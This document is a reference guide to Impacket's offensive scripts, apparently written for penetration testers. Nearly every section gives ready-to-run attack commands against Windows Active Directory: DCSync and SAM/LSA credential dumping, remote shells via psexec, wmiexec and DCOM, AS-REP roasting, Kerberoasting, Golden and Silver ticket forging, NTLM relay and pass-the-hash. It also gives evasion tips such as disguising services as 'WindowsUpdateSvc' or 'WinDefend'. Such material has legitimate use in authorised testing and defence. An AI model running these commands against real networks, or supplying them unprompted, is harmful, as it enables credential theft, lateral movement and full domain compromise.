# Impacket Scripts Reference

Comprehensive documentation for Impacket's most important scripts, organized by functionality.

## Table of Contents

- [Authentication Methods](#authentication-methods)
- [Credential Extraction](#credential-extraction)
  - [secretsdump.py](#secretsdumppy)
- [Remote Execution](#remote-execution)
  - [psexec.py](#psexecpy)
  - [wmiexec.py](#wmiexecpy)
  - [smbexec.py](#smbexecpy)
  - [atexec.py](#atexecpy)
  - [dcomexec.py](#dcomexecpy)
- [Kerberos Attacks](#kerberos-attacks)
  - [GetNPUsers.py](#getnpuserspy)
  - [GetUserSPNs.py](#getuserspnspy)
  - [getTGT.py](#gettgtpy)
  - [getST.py](#getstpy)
  - [ticketer.py](#ticketerpy)
- [Relay Attacks](#relay-attacks)
  - [ntlmrelayx.py](#ntlmrelayxpy)
- [Pass-the-Hash and Pass-the-Ticket](#pass-the-hash-and-pass-the-ticket)
- [Overpass-the-Hash](#overpass-the-hash)

---

## Authentication Methods

All Impacket scripts support multiple authentication methods. The target format is:

```
[[domain/]username[:password]@]<target>
```

### Common Authentication Options

| Option | Description |
|--------|-------------|
| `-hashes LMHASH:NTHASH` | Use NTLM hashes (pass-the-hash) |
| `-no-pass` | Don't ask for password (useful with -k) |
| `-k` | Use Kerberos authentication |
| `-aesKey KEY` | Use AES key for Kerberos |
| `-dc-ip IP` | IP of the Domain Controller |
| `-target-ip IP` | IP of the target (when using hostname) |

### Authentication Examples

```bash
# Password authentication
script.py DOMAIN/user:password@target

# Pass-the-hash (NTLM)
script.py -hashes :aad3b435b51404eeaad3b435b51404ee DOMAIN/user@target

# Kerberos with ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
script.py -k -no-pass DOMAIN/user@target.domain.local

# Kerberos with AES256 key
script.py -aesKey aes256-key-here DOMAIN/user@target
```

---

## Credential Extraction

### secretsdump.py

The most powerful credential extraction tool in Impacket. Performs DCSync attacks, dumps SAM/LSA/NTDS remotely or from local files.

#### Key Options

| Option | Description |
|--------|-------------|
| `-just-dc` | Extract only NTDS.DIT data (DRSUAPI method, no registry) |
| `-just-dc-ntlm` | Extract only NTDS.DIT hashes (no Kerberos keys) |
| `-just-dc-user USER` | DCSync only for specific user(s) |
| `-history` | Include password history |
| `-pwd-last-set` | Show pwdLastSet attribute |
| `-user-status` | Show user enabled/disabled status |
| `-sam` | Dump SAM hashes |
| `-lsa` | Dump LSA secrets |
| `-ntds` | Dump NTDS.DIT hashes |
| `-system FILE` | Path to SYSTEM hive (for local extraction) |
| `-security FILE` | Path to SECURITY hive |
| `-sam FILE` | Path to SAM hive |
| `-ntds FILE` | Path to NTDS.DIT file |
| `-outputfile FILE` | Base output filename |
| `-exec-method METHOD` | Execution method: smbexec, wmiexec, mmcexec |

#### DCSync Attack (Remote)

DCSync uses the Directory Replication Service (DRSUAPI) to replicate credentials from a Domain Controller. Requires **Replicating Directory Changes** and **Replicating Directory Changes All** permissions (typically Domain Admins).

```bash
# Full DCSync - dump all domain hashes
secretsdump.py domain.local/admin:Password123@dc01.domain.local

# DCSync with pass-the-hash
secretsdump.py -hashes :ntlmhash domain.local/admin@dc01.domain.local

# DCSync specific user (krbtgt for Golden Ticket)
secretsdump.py -just-dc-user krbtgt domain.local/admin:Password123@dc01.domain.local

# DCSync specific user with Kerberos auth
secretsdump.py -k -no-pass -just-dc-user administrator domain.local/admin@dc01.domain.local

# DCSync all users with password history
secretsdump.py -just-dc -history domain.local/admin:Password123@dc01.domain.local

# NTLM hashes only (faster, smaller output)
secretsdump.py -just-dc-ntlm domain.local/admin:Password123@dc01.domain.local

# Output to file
secretsdump.py -just-dc -outputfile dc_dump domain.local/admin:Password123@dc01.domain.local
```

#### Remote SAM/LSA/Cached Creds

Extracts credentials from a remote host (not DC). Requires local admin on target.

```bash
# Dump SAM, LSA secrets, and cached credentials
secretsdump.py domain.local/admin:Password123@workstation.domain.local

# Only SAM database
secretsdump.py -sam domain.local/admin:Password123@target

# Only LSA secrets (service accounts, autologon, etc.)
secretsdump.py -lsa domain.local/admin:Password123@target

# Use specific execution method
secretsdump.py -exec-method wmiexec domain.local/admin:Password123@target
```

#### Local File Extraction

Extract hashes from registry hives or NTDS.DIT offline.

```bash
# Extract from copied registry hives (SAM + SYSTEM required)
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Extract from SAM, SYSTEM, and SECURITY hives
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# Extract from NTDS.DIT offline (requires SYSTEM hive)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# With password history
secretsdump.py -ntds ntds.dit -system SYSTEM -history LOCAL
```

#### Output Format

secretsdump outputs hashes in different formats:

```
# Domain user (from DCSync)
domain.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Local user (from SAM)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# LSA secrets
DPAPI_SYSTEM:01000000...
NL$KM:01000000...
_SC_ServiceName:password_here

# Cached domain credentials (DCC2)
$DCC2$10240#Administrator#hash
```

---

## Remote Execution

### psexec.py

Creates a Windows service to execute commands. Returns a **SYSTEM-level** shell. Writes files to disk (detected by AV).

#### Key Options

| Option | Description |
|--------|-------------|
| `-c FILE` | Copy and execute local file |
| `-path PATH` | Path to place executable (default: ADMIN$) |
| `-serviceName NAME` | Custom service name (avoid detection) |
| `-remote-binary-name NAME` | Name for remote binary |
| `-codec CODEC` | Output encoding (default: utf-8) |

#### Usage Examples

```bash
# Interactive SYSTEM shell
psexec.py domain.local/admin:Password123@target.domain.local

# Execute specific command
psexec.py domain.local/admin:Password123@target.domain.local "whoami /all"

# Pass-the-hash
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@target

# Kerberos authentication
psexec.py -k -no-pass domain.local/admin@target.domain.local

# Custom service name (evasion)
psexec.py -serviceName "WindowsUpdateSvc" domain.local/admin:Password123@target

# Copy and execute local binary
psexec.py -c /path/to/binary.exe domain.local/admin:Password123@target

# Execute with cmd.exe
psexec.py domain.local/admin:Password123@target "cmd.exe /c whoami"
```

#### When to Use

- Need SYSTEM-level privileges
- Target has SMB (445) accessible
- AV detection is not a concern (or custom service name used)
- Need persistent/interactive shell

---

### wmiexec.py

Executes commands via Windows Management Instrumentation (WMI). More stealthy than psexec.py - **no files written to disk**. Runs as the authenticated user (not SYSTEM).

#### Key Options

| Option | Description |
|--------|-------------|
| `-shell-type TYPE` | Shell type: cmd or powershell |
| `-codec CODEC` | Output encoding |
| `-silentcommand` | Don't retrieve command output |
| `-nooutput` | Alias for -silentcommand |

#### Usage Examples

```bash
# Semi-interactive shell
wmiexec.py domain.local/admin:Password123@target.domain.local

# Execute single command
wmiexec.py domain.local/admin:Password123@target "hostname"

# Pass-the-hash
wmiexec.py -hashes :ntlmhash domain.local/admin@target

# Kerberos authentication
wmiexec.py -k -no-pass domain.local/admin@target.domain.local

# PowerShell shell
wmiexec.py -shell-type powershell domain.local/admin:Password123@target

# Execute without waiting for output (faster, stealthier)
wmiexec.py -silentcommand domain.local/admin:Password123@target "command"
```

#### When to Use

- Need stealthy execution
- AV/EDR is active
- Don't need SYSTEM privileges
- Target has WMI/DCOM accessible (135 + high ports)

---

### smbexec.py

Similar to psexec.py but uses a different method. Creates a service that runs commands via cmd.exe. Slightly more stealthy than psexec.

#### Key Options

| Option | Description |
|--------|-------------|
| `-share SHARE` | Share to use (default: C$) |
| `-mode {SHARE,SERVER}` | Execution mode |
| `-codec CODEC` | Output encoding |
| `-shell-type TYPE` | Shell type: cmd or powershell |
| `-service-name NAME` | Custom service name |

#### Usage Examples

```bash
# Semi-interactive shell
smbexec.py domain.local/admin:Password123@target.domain.local

# Pass-the-hash
smbexec.py -hashes :ntlmhash domain.local/admin@target

# Custom service name
smbexec.py -service-name "WinDefend" domain.local/admin:Password123@target

# Use different share
smbexec.py -share ADMIN$ domain.local/admin:Password123@target

# PowerShell mode
smbexec.py -shell-type powershell domain.local/admin:Password123@target
```

#### When to Use

- psexec.py is blocked
- Need SMB-based execution
- SYSTEM shell is required

---

### atexec.py

Executes commands via the Windows Task Scheduler (AT service). Good for evasion as task scheduler is commonly used.

#### Key Options

| Option | Description |
|--------|-------------|
| `-session-id ID` | Execute in specific session |
| `-silentcommand` | Don't wait for output |
| `-codec CODEC` | Output encoding |

#### Usage Examples

```bash
# Execute command via Task Scheduler
atexec.py domain.local/admin:Password123@target "whoami"

# Pass-the-hash
atexec.py -hashes :ntlmhash domain.local/admin@target "hostname"

# Kerberos authentication
atexec.py -k -no-pass domain.local/admin@target.domain.local "ipconfig"

# Silent execution (no output retrieval)
atexec.py -silentcommand domain.local/admin:Password123@target "cmd /c start calc.exe"
```

#### When to Use

- Other execution methods are blocked
- Need to blend with normal task scheduler activity
- Executing in specific user session

---

### dcomexec.py

Executes commands via DCOM (Distributed COM). Multiple execution objects available. Very stealthy.

#### Key Options

| Option | Description |
|--------|-------------|
| `-object OBJECT` | DCOM object: ShellWindows, ShellBrowserWindow, MMC20 |
| `-shell-type TYPE` | Shell type: cmd or powershell |
| `-codec CODEC` | Output encoding |
| `-silentcommand` | Don't retrieve output |

#### Usage Examples

```bash
# Default object (MMC20)
dcomexec.py domain.local/admin:Password123@target.domain.local

# ShellWindows object
dcomexec.py -object ShellWindows domain.local/admin:Password123@target

# ShellBrowserWindow object
dcomexec.py -object ShellBrowserWindow domain.local/admin:Password123@target

# MMC20 Application object
dcomexec.py -object MMC20 domain.local/admin:Password123@target

# Pass-the-hash
dcomexec.py -hashes :ntlmhash domain.local/admin@target

# Execute specific command
dcomexec.py domain.local/admin:Password123@target "whoami"
```

#### DCOM Objects Comparison

| Object | Process Created | Notes |
|--------|-----------------|-------|
| MMC20 | mmc.exe | Most common, may trigger alerts |
| ShellWindows | explorer.exe | Stealthy, runs in existing process |
| ShellBrowserWindow | explorer.exe | Similar to ShellWindows |

#### When to Use

- Maximum stealth required
- Other methods are blocked
- DCOM/RPC ports accessible (135 + high ports)

---

## Kerberos Attacks

### GetNPUsers.py

AS-REP Roasting - requests authentication data for users that have "Do not require Kerberos preauthentication" enabled. No credentials needed to check for vulnerable users.

#### Key Options

| Option | Description |
|--------|-------------|
| `-usersfile FILE` | File with usernames to test |
| `-request` | Request TGT for found users |
| `-format {hashcat,john}` | Output format (default: hashcat) |
| `-outputfile FILE` | Save hashes to file |
| `-no-pass` | Don't prompt for password |
| `-dc-ip IP` | Domain Controller IP |

#### Usage Examples

```bash
# Check single user (no creds)
GetNPUsers.py domain.local/username -no-pass -dc-ip 10.10.10.1

# Check user list (no creds)
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1

# Request hashes for vulnerable users (hashcat format)
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1 -request -format hashcat

# Request hashes (john format)
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1 -request -format john

# With valid credentials (enumerate all users)
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.1 -request

# Save to file
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.1 -request -outputfile asrep_hashes.txt

# Using Kerberos auth
GetNPUsers.py domain.local/user -k -no-pass -dc-ip 10.10.10.1 -request
```

#### Cracking AS-REP Hashes

```bash
# Hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# John the Ripper
john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt
```

#### When to Use

- Initial access without credentials
- Looking for accounts with weak Kerberos settings
- Part of domain enumeration

---

### GetUserSPNs.py

Kerberoasting - requests service tickets (TGS) for accounts with Service Principal Names (SPNs). The ticket is encrypted with the service account's hash, which can be cracked offline.

#### Key Options

| Option | Description |
|--------|-------------|
| `-request` | Request TGS for found SPNs |
| `-request-user USER` | Request TGS for specific user |
| `-outputfile FILE` | Save hashes to file |
| `-format {hashcat,john}` | Output format |
| `-dc-ip IP` | Domain Controller IP |
| `-save` | Save tickets to disk (ccache) |
| `-target-domain DOMAIN` | Target domain for enumeration |

#### Usage Examples

```bash
# Enumerate SPNs (list only)
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1

# Request all service tickets (hashcat format)
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request

# Request specific user's TGS
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request-user sqlservice

# Save to file
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt

# John format
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request -format john

# Pass-the-hash
GetUserSPNs.py -hashes :ntlmhash domain.local/user@dc01 -dc-ip 10.10.10.1 -request

# Kerberos auth
GetUserSPNs.py domain.local/user -k -no-pass -dc-ip 10.10.10.1 -request

# Save ccache tickets
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request -save
```

#### Cracking Kerberoast Hashes

```bash
# Hashcat (mode 13100 for rc4, 19600 for aes128, 19700 for aes256)
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# John the Ripper
john --format=krb5tgs tgs_hashes.txt --wordlist=wordlist.txt
```

#### When to Use

- Have valid domain credentials
- Looking for service accounts with weak passwords
- Privilege escalation within domain

---

### getTGT.py

Requests a Kerberos Ticket Granting Ticket (TGT) using password, hash, or AES key. Useful for obtaining tickets for pass-the-ticket attacks.

#### Key Options

| Option | Description |
|--------|-------------|
| `-dc-ip IP` | Domain Controller IP |
| `-hashes LMHASH:NTHASH` | NTLM hashes |
| `-aesKey KEY` | AES128 or AES256 key |

#### Usage Examples

```bash
# Request TGT with password
getTGT.py domain.local/user:password -dc-ip 10.10.10.1

# Request TGT with NTLM hash (Overpass-the-Hash)
getTGT.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/user -dc-ip 10.10.10.1

# Request TGT with AES256 key
getTGT.py -aesKey 8f5f3b3e... domain.local/user -dc-ip 10.10.10.1

# Output is saved to user.ccache
export KRB5CCNAME=user.ccache
```

#### When to Use

- Need to convert NTLM hash to Kerberos ticket
- Overpass-the-hash attacks
- Obtaining tickets for lateral movement

---

### getST.py

Requests a Service Ticket (TGS) for a specific SPN. Supports S4U2Self/S4U2Proxy for delegation attacks.

#### Key Options

| Option | Description |
|--------|-------------|
| `-spn SPN` | Target Service Principal Name |
| `-impersonate USER` | User to impersonate (delegation) |
| `-dc-ip IP` | Domain Controller IP |
| `-altservice SERVICE` | Alternative service (S4U2Proxy) |
| `-self` | Use S4U2Self |
| `-additional-ticket TICKET` | Additional ticket for S4U2Proxy |
| `-force-forwardable` | Force forwardable flag |
| `-u2u` | User-to-User authentication |

#### Usage Examples

```bash
# Request service ticket
getST.py -spn cifs/target.domain.local domain.local/user:password -dc-ip 10.10.10.1

# Request with TGT (pass-the-ticket)
export KRB5CCNAME=user.ccache
getST.py -spn cifs/target.domain.local domain.local/user -k -no-pass -dc-ip 10.10.10.1

# S4U2Self - impersonate user (requires delegation)
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/svc_account:password -dc-ip 10.10.10.1

# S4U2Proxy with alternative service
getST.py -spn http/target.domain.local -impersonate administrator -altservice cifs/target.domain.local domain.local/svc_account:password -dc-ip 10.10.10.1

# Using NTLM hash
getST.py -hashes :ntlmhash -spn cifs/target.domain.local domain.local/user -dc-ip 10.10.10.1

# Resource-Based Constrained Delegation (RBCD)
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip 10.10.10.1 domain.local/controlled_computer$ -hashes :computer_hash
```

#### When to Use

- Delegation abuse (constrained, resource-based)
- Need service ticket for specific SPN
- Impersonating users via S4U extensions

---

### ticketer.py

Creates Golden and Silver tickets. Requires the krbtgt hash (Golden) or service account hash (Silver).

#### Key Options

| Option | Description |
|--------|-------------|
| `-nthash HASH` | NTLM hash of krbtgt (Golden) or service (Silver) |
| `-aesKey KEY` | AES key (preferred over NTLM) |
| `-domain DOMAIN` | Domain FQDN |
| `-domain-sid SID` | Domain SID |
| `-user USER` | Username in the ticket |
| `-user-id ID` | User RID (default: 500) |
| `-groups GROUPS` | Group RIDs (default: 513, 512, 520, 518, 519) |
| `-spn SPN` | Target SPN (Silver ticket) |
| `-request` | Request PAC from DC |
| `-extra-sid SIDS` | Extra SIDs (for SID history attacks) |
| `-duration DAYS` | Ticket duration in days |
| `-extra-pac` | Include extra PAC info |

#### Golden Ticket

Creates a TGT forged with the krbtgt hash. Provides domain admin access.

```bash
# Create Golden Ticket
ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-... -domain domain.local administrator

# With AES256 key (more OpSec)
ticketer.py -aesKey <krbtgt_aes256_key> -domain-sid S-1-5-21-... -domain domain.local administrator

# Custom groups
ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -domain domain.local -groups 512,513,518,519,520 customuser

# Extra SIDs (SID History attack / cross-domain)
ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -domain domain.local -extra-sid S-1-5-21-parent-domain-519 administrator

# Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

#### Silver Ticket

Creates a TGS forged with a service account hash. Limited to specific service.

```bash
# Create Silver Ticket for CIFS (file shares)
ticketer.py -nthash <service_ntlm_hash> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator

# Silver Ticket for HTTP (web services)
ticketer.py -nthash <service_ntlm_hash> -domain-sid S-1-5-21-... -domain domain.local -spn http/target.domain.local administrator

# Silver Ticket for MSSQL
ticketer.py -nthash <sql_service_hash> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sql01.domain.local:1433 administrator

# Silver Ticket for HOST (PSExec, services)
ticketer.py -nthash <computer_hash> -domain-sid S-1-5-21-... -domain domain.local -spn host/target.domain.local administrator

# With AES key
ticketer.py -aesKey <service_aes256_key> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator

# Use the ticket
export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass domain.local/administrator@target.domain.local
```

#### Common SPNs for Silver Tickets

| SPN | Service | Use Case |
|-----|---------|----------|
| cifs/host | SMB | File access, psexec |
| host/host | Generic Host | WMI, PowerShell Remoting |
| http/host | HTTP/HTTPS | Web services, ADWS |
| ldap/host | LDAP | AD queries, DCSync (with proper SPN) |
| mssqlsvc/host:port | SQL Server | Database access |
| wsman/host | WinRM | PowerShell Remoting |
| rpcss/host | RPC | DCOM, WMI |

#### When to Use

- **Golden Ticket**: Full domain compromise, persistence
- **Silver Ticket**: Access to specific service, stealth (no DC contact)

---

## Relay Attacks

### ntlmrelayx.py

NTLM Relay attack tool. Captures NTLM authentication and relays to other targets.

#### Key Options

| Option | Description |
|--------|-------------|
| `-t TARGET` | Single target |
| `-tf FILE` | Targets file |
| `-smb2support` | Enable SMB2 support |
| `-i` | Interactive shell |
| `-e FILE` | Execute file on target |
| `-c COMMAND` | Execute command |
| `-socks` | Start SOCKS proxy |
| `--no-smb-server` | Disable SMB server |
| `--no-http-server` | Disable HTTP server |
| `-wh HOST` | WPAD host for WPAD attack |
| `-6` | IPv6 mode |
| `-l LOOT` | Directory for loot |
| `--remove-mic` | Remove MIC (CVE-2019-1040) |
| `--delegate-access` | Delegate access attack |
| `--escalate-user USER` | User to escalate |
| `--add-computer` | Add computer account |
| `--dump-laps` | Dump LAPS passwords |
| `--dump-gmsa` | Dump gMSA passwords |
| `--dump-adcs` | Dump AD CS templates |
| `-ntlmchallenge CHALLENGE` | Custom NTLM challenge |

#### Basic Relay Attacks

```bash
# Start relay to single target
ntlmrelayx.py -t smb://192.168.1.100 -smb2support

# Relay to multiple targets
ntlmrelayx.py -tf targets.txt -smb2support

# Execute command on relay
ntlmrelayx.py -t smb://192.168.1.100 -smb2support -c "whoami > C:\\test.txt"

# Interactive SMB shell
ntlmrelayx.py -t smb://192.168.1.100 -smb2support -i

# Relay and dump SAM
ntlmrelayx.py -t smb://192.168.1.100 -smb2support

# SOCKS proxy for continued access
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Use with proxychains
proxychains secretsdump.py -no-pass domain/user@target
```

#### LDAP Relay Attacks

```bash
# Relay to LDAP (add user to group, etc.)
ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user user

# Delegate access attack (RBCD)
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access

# Add computer account
ntlmrelayx.py -t ldap://dc01.domain.local --add-computer

# Dump LAPS passwords
ntlmrelayx.py -t ldap://dc01.domain.local --dump-laps

# Dump gMSA passwords
ntlmrelayx.py -t ldaps://dc01.domain.local --dump-gmsa
```

#### AD CS Relay (ESC8)

```bash
# Relay to AD CS web enrollment
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs

# With specific template
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template User
```

#### WPAD Attack

```bash
# WPAD attack with Responder providing WPAD
ntlmrelayx.py -tf targets.txt -wh attacker-ip -smb2support
```

#### Common Relay Attack Workflow

```bash
# 1. Start Responder (disable SMB/HTTP)
sudo responder -I eth0 -w -d -F

# 2. Start ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -socks

# 3. Use SOCKS connections
proxychains secretsdump.py -no-pass 'domain/user@target'
proxychains smbclient.py -no-pass 'domain/user@target'
```

#### When to Use

- NTLM authentication is used (no EPA/signing)
- SMB signing disabled
- LDAP signing disabled
- Coercing authentication (PetitPotam, PrinterBug)

---

## Pass-the-Hash and Pass-the-Ticket

### Pass-the-Hash (PtH)

Use NTLM hashes instead of passwords. Works with NTLM authentication.

```bash
# All scripts support -hashes option
# Format: -hashes LMHASH:NTHASH (LM can be empty)

# Remote execution
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@target
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@target
smbexec.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@target
atexec.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@target "command"
dcomexec.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@target

# Credential extraction
secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@target

# Kerberoasting
GetUserSPNs.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/user@dc01 -request

# SMB client
smbclient.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin@target

# With LM hash (old systems)
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ntlmhash domain.local/admin@target
```

### Pass-the-Ticket (PtT)

Use Kerberos tickets (ccache files) for authentication.

```bash
# Export ticket location
export KRB5CCNAME=/path/to/ticket.ccache

# Use -k -no-pass with any script
psexec.py -k -no-pass domain.local/admin@target.domain.local
wmiexec.py -k -no-pass domain.local/admin@target.domain.local
smbexec.py -k -no-pass domain.local/admin@target.domain.local
secretsdump.py -k -no-pass domain.local/admin@dc01.domain.local
smbclient.py -k -no-pass domain.local/admin@target.domain.local

# Important: Use FQDN (hostname.domain.local) with Kerberos
# IP addresses won't work with Kerberos authentication

# Convert kirbi (Mimikatz) to ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Convert ccache to kirbi
ticketConverter.py ticket.ccache ticket.kirbi
```

---

## Overpass-the-Hash

Convert NTLM hash to Kerberos ticket, then use Kerberos authentication. Useful when NTLM is blocked but Kerberos is allowed.

```bash
# Step 1: Get TGT using NTLM hash
getTGT.py -hashes :aad3b435b51404eeaad3b435b51404ee domain.local/admin -dc-ip 10.10.10.1

# Output: admin.ccache

# Step 2: Export ticket
export KRB5CCNAME=admin.ccache

# Step 3: Use Kerberos authentication
psexec.py -k -no-pass domain.local/admin@target.domain.local
wmiexec.py -k -no-pass domain.local/admin@target.domain.local
secretsdump.py -k -no-pass domain.local/admin@dc01.domain.local

# One-liner approach
getTGT.py -hashes :hash domain.local/admin -dc-ip DC_IP && export KRB5CCNAME=admin.ccache && psexec.py -k -no-pass domain.local/admin@target.domain.local
```

### Using AES Keys (More OpSec-Friendly)

AES keys don't trigger the same detection rules as NTLM hashes.

```bash
# Get TGT with AES256 key
getTGT.py -aesKey 8f5f3b3e7f4b5a6c... domain.local/admin -dc-ip 10.10.10.1

# All scripts support -aesKey
psexec.py -aesKey 8f5f3b3e7f4b5a6c... domain.local/admin@target
wmiexec.py -aesKey 8f5f3b3e7f4b5a6c... domain.local/admin@target
secretsdump.py -aesKey 8f5f3b3e7f4b5a6c... domain.local/admin@dc01
```

---

## Additional Useful Scripts

### smbclient.py

Interactive SMB client for file operations.

```bash
# Connect to share
smbclient.py domain.local/user:password@target

# Commands: shares, use, ls, cd, get, put, rm, mkdir, etc.
```

### lookupsid.py

Enumerate users via SID brute-forcing.

```bash
lookupsid.py domain.local/user:password@dc01 500-600
```

### rpcdump.py

Enumerate RPC endpoints.

```bash
rpcdump.py domain.local/user:password@target
```

### reg.py

Remote registry operations.

```bash
reg.py domain.local/admin:password@target query -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa
```

### services.py

Remote service management.

```bash
services.py domain.local/admin:password@target list
services.py domain.local/admin:password@target start -name "ServiceName"
```

### mssqlclient.py

MSSQL client with xp_cmdshell support.

```bash
mssqlclient.py domain.local/user:password@sqlserver -windows-auth
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
```

---

## Troubleshooting

### Common Errors

| Error | Solution |
|-------|----------|
| `STATUS_LOGON_FAILURE` | Wrong credentials or hash format |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User doesn't exist in domain |
| `KDC_ERR_PREAUTH_FAILED` | Wrong password/hash |
| `STATUS_ACCESS_DENIED` | Insufficient privileges |
| `Connection refused` | Port blocked or service not running |
| `KRB_AP_ERR_SKEW` | Time skew >5 minutes, sync clocks |

### Kerberos Time Sync

```bash
# Check time difference
net time -S dc01.domain.local

# Sync time (Linux)
sudo ntpdate dc01.domain.local

# Or use faketime
faketime -f "+2h" psexec.py -k -no-pass domain/user@target
```

### Ensure Hostnames Resolve

```bash
# Add to /etc/hosts
echo "10.10.10.1 dc01.domain.local dc01" | sudo tee -a /etc/hosts
```
